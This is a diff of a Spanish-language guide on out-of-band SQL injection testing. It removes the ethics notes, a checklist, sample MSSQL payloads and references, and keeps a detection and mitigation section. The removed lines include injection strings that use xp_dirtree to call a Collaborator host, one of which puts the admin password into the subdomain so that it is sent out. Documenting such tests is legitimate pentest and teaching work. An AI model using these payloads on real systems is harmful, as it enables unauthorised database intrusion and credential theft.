@@ -131,35 +131,6 @@ Aquí se envía un hash (reduce tamaño y evita caracteres problemáticos).
 
 ---
 
-## Consideraciones éticas y legales
-
-* OAST implica comunicación con servidores externos y posible exfiltración de datos reales. **Sólo** realizar estas pruebas en entornos autorizados (labs, pentest con permiso).
-* Registrar y documentar todo: payloads, timestamps y evidencia.
-* Evitar exfiltrar datos sensibles de entornos reales salvo con permiso explícito.
-
----
-
-## Checklist y payloads de ejemplo (plantilla)
-
-**Checklist previo:**
-
-* ¿Tengo permiso?
-* ¿La DB tiene funciones/procs que puedan provocar OOB?
-* ¿Hay egress DNS/HTTP permitido?
-* ¿Voy a codificar/segmentar el dato?
-
-**Payloads ejemplo (MSSQL)** — sustituir `<UNIQUE>` por tu subdominio único:
-
-```sql
-'; exec master..xp_dirtree '//<UNIQUE>.collaborator.net/a'--
-
-'; EXEC('master..xp_dirtree "//'+(SELECT TOP 1 password FROM users WHERE username='admin')+'.<UNIQUE>.collaborator.net/a"')--
-```
-
-**Nota:** en el segundo ejemplo la concatenación se hace en tiempo de ejecución para incluir el dato en el subdominio.
-
----
-
 ## Detección y mitigación
 
 * **Egress filtering**: bloquear/detección de resoluciones DNS no autorizadas y restringir salidas HTTP/SMB.
@@ -169,11 +140,4 @@ Aquí se envía un hash (reduce tamaño y evita caracteres problemáticos).
 
 ---
 
-## Recursos y referencias
 
-* Burp Suite Collaborator docs.
-* OWASP OAST and OOB testing references.
-* Documentación oficial de procedimientos extendidos (MSSQL xp_cmdshell/xp_dirtree, Oracle UTL_HTTP, PostgreSQL dblink).
-
-* Preparar un ejemplo práctico con Burp Collaborator (paso a paso) para un lab.
-  ¿Qué preferís?
